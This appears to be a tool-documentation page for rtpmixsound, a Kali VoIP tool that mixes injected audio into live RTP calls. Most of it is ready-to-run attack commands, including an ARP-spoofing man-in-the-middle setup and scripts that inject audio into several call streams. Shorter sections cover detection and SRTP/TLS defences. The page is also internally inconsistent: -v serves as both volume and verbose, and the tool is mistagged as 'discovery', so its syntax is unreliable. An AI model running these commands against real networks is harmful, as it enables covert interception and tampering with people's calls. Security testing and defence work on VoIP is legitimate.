---
title: rtpmixsound
description: Non-destructive audio mixing tool for RTP streams
mitre_tactic: discovery
mitre_tactic_id: TA0007
mitre_subcategory: voip
categories:
  - voip
  - audio-mixing
  - rtp-manipulation
  - discovery
tags:
  - rtp
  - voip
  - audio
  - mixing
  - non-destructive
install_command: sudo apt install rtpmixsound
version: "1.0"
github_repo: https://github.com/0x90/rtpmixsound
kali_tools_page: https://www.kali.org/tools/rtpmixsound/
difficulty_level: advanced
requires_root: true
gui_available: false
related_tools:
  - rtpinsertsound
  - rtpbreak
  - wireshark
---

# rtpmixsound

## 1. Introduction

### What is rtpmixsound?

rtpmixsound is a VoIP security testing tool that mixes audio into active RTP (Real-time Transport Protocol) streams without destroying the original audio. Unlike rtpinsertsound which replaces audio, rtpmixsound adds audio to the existing stream, making it ideal for stealthy security testing and demonstration of VoIP vulnerabilities.

### History

rtpmixsound was developed as a companion to rtpinsertsound to provide a non-destructive method of audio injection. While rtpinsertsound completely replaces the original audio, rtpmixsound blends new audio with existing content, making it more suitable for security assessments where maintaining call functionality is important.

### When to Use

- **Stealthy VoIP security testing** where call continuity matters
- **Security demonstrations** showing mixing vulnerabilities
- **Training scenarios** requiring background audio injection
- **Compliance testing** for encrypted voice requirements
- **Research** into VoIP attack vectors

### VoIP Concepts

**RTP Stream Mixing:**

Without encryption, RTP streams can be intercepted and modified. rtpmixsound exploits this by:

1. Identifying active RTP streams
2. Capturing existing audio
3. Mixing new audio with existing content
4. Injecting combined audio back into the stream

**Mixing vs Insertion:**

| Feature | rtpmixsound | rtpinsertsound |
|---------|-------------|----------------|
| Original Audio | Preserved | Replaced |
| Stealth | High | Low |
| Use Case | Background injection | Complete takeover |
| Complexity | Higher | Lower |

---

## 2. Installation

### Kali Linux (Default)

```bash
sudo apt update
sudo apt install rtpmixsound
```

### Verify Installation

```bash
rtpmixsound --help
```

### Dependencies

```bash
sudo apt install libpcap-dev libasound2-dev
```

---

## 3. Core Concepts

### Audio Mixing Architecture

```
+-----------+    RTP Stream    +------------------+
| rtpmix    | <-------------> | Active VoIP Call |
+-----------+                 +------------------+
     |                              |
     |    Mix Audio Packets         |
     +------------------------------+
     |
     v
+-----------+    Audio File   +------------------+
| WAV/RAW   | -------------> | Mixed RTP Stream |
+-----------+                 +------------------+
```

**Mixing Process:**

1. **Capture**: Intercept existing RTP packets
2. **Decode**: Extract audio from existing packets
3. **Mix**: Combine with new audio
4. **Encode**: Re-encode mixed audio
5. **Inject**: Send mixed packets back

**Volume Control:**

| Level | Description |
|-------|-------------|
| 0% | No mixing (passthrough) |
| 25% | Background audio |
| 50% | Equal volume |
| 75% | Dominant mixing |
| 100% | Full replacement |

---

## 4. Command Reference

### Basic Syntax

```
rtpmixsound [options] <target>
```

### Command-Line Options

| Flag | Long Form | Description |
|------|-----------|-------------|
| `-i` | `--interface` | Network interface |
| `-f` | `--file` | Audio file to mix |
| `-r` | `--rtp-port` | Target RTP port |
| `-s` | `--source` | Source IP address |
| `-d` | `--destination` | Destination IP address |
| `-v` | `--volume` | Mix volume (0-100) |
| `-l` | `--loop` | Loop audio file |
| `-g` | `--gain` | Audio gain (dB) |
| `-p` | `--payload-type` | RTP payload type |

---

## 5. Examples

### Example 1: Basic Audio Mixing

Mix audio into an RTP stream:

```bash
sudo rtpmixsound -i eth0 -f background.wav -r 10000 -s 192.168.1.100 -d 192.168.1.200
```

### Example 2: Low Volume Mixing

Background audio injection:

```bash
sudo rtpmixsound -i eth0 -f background.wav -r 10000 -v 25 -s 192.168.1.100 -d 192.168.1.200
```

### Example 3: Equal Volume Mixing

Mix at equal volume:

```bash
sudo rtpmixsound -i eth0 -f music.wav -r 10000 -v 50 -s 192.168.1.100 -d 192.168.1.200
```

### Example 4: Loop with Gain

Continuous mixing with volume boost:

```bash
sudo rtpmixsound -i eth0 -f loop.wav -r 10000 -l -g 5 -s 192.168.1.100 -d 192.168.1.200
```

### Example 5: With Stream Detection

Detect streams first, then mix:

```bash
# Detect streams
sudo rtpbreak -i capture.pcap -a -v

# Mix audio
sudo rtpmixsound -i eth0 -f background.wav -r 10000 -v 30 -s 192.168.1.100 -d 192.168.1.200
```

---

## 6. Advanced Usage

### Audio Format Conversion

```bash
# Convert WAV to RAW for mixing
sox input.wav -r 8000 -c 1 -e a-law output.raw

# Convert to specific codec format
sox input.wav -r 16000 -c 1 -e signed-integer -b 16 output.raw
```

### ARP Spoofing Integration

```bash
# Step 1: Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Step 2: ARP spoof
sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.200 &
sudo arpspoof -i eth0 -t 192.168.1.200 192.168.1.100 &

# Step 3: Mix audio
sudo rtpmixsound -i eth0 -f background.wav -r 10000 -v 30 -s 192.168.1.100 -d 192.168.1.200
```

### Automation Script

```bash
#!/bin/bash
INTERFACE="eth0"
AUDIO_FILE="background.wav"
RTP_PORT="10000"
VOLUME="30"
TARGET_SRC="192.168.1.100"
TARGET_DST="192.168.1.200"

echo "Starting audio mixing..."
sudo rtpmixsound -i $INTERFACE -f $AUDIO_FILE -r $RTP_PORT -v $VOLUME -s $TARGET_SRC -d $TARGET_DST -l
```

### Multi-Stream Mixing

```bash
#!/bin/bash
# Mix audio into multiple streams simultaneously
STREAMS="10000 10002 10004"
AUDIO="background.wav"

for port in $STREAMS; do
    sudo rtpmixsound -i eth0 -f $AUDIO -r $port -v 20 -s 192.168.1.100 -d 192.168.1.200 &
done
```

---

## 7. Detection & Defense

### Detection Methods

**Network Monitoring:**

```bash
# Detect unusual RTP traffic
sudo tcpdump -i eth0 "udp and port 10000-20000" -n -c 100

# Monitor for mixed packets
sudo tcpdump -i eth0 "udp and port 10000" -v | grep -i "payload"
```

**IDS Signatures:**

```
alert udp 192.168.1.0/24 any -> 192.168.1.0/24 10000:20000 (msg:"RTP Mixing Detected"; dsize:>200; threshold:type both, track by_src, count 100, seconds 10; sid:1000006; rev:1;)
```

### Defense Strategies

**SRTP Encryption:**

Enable SRTP to prevent mixing:

```bash
# Asterisk SRTP configuration
; /etc/asterisk/sip.conf
[general]
encryption=yes
```

**Network Security:**

- Implement 802.1X authentication
- Use VLANs for VoIP isolation
- Deploy VoIP-aware firewalls
- Enable DHCP snooping

**Certificate-Based Authentication:**

```bash
# SIP TLS configuration
; /etc/asterisk/sip.conf
[general]
tlsenable=yes
tlsbindaddr=0.0.0.0
tlscertfile=/etc/asterisk/certs/server.pem
tlscafile=/etc/asterisk/certs/ca.pem
```

---

## 8. Troubleshooting

### Common Issues

| Issue | Cause | Solution |
|-------|-------|----------|
| No mixing | Wrong RTP port | Use rtpbreak to detect streams |
| Garbled audio | Wrong codec | Match payload type with `-p` |
| Permission denied | Root required | Use `sudo` |
| Mixing fails | Firewall blocking | Check iptables rules |

### Debug Commands

```bash
# Verbose mode
sudo rtpmixsound -i eth0 -f audio.wav -r 10000 -v 50 -v

# Capture mixed traffic
sudo tcpdump -i eth0 "udp and port 10000" -w mixed.pcap

# Verify audio format
file audio.wav
soxi audio.wav
```

### Audio Quality Issues

```bash
# Check audio properties
soxi background.wav

# Convert to correct format
sox background.wav -r 8000 -c 1 -e a-law background.raw

# Test audio playback
aplay background.wav
```

---

## Resources

- [RTP RFC 3550](https://tools.ietf.org/html/rfc3550)
- [SRTP RFC 3711](https://tools.ietf.org/html/rfc3711)
- [VoIP Security Testing](https://www.sans.org/white-papers/voip-security/)
- [OWASP VoIP Security](https://owasp.org/)
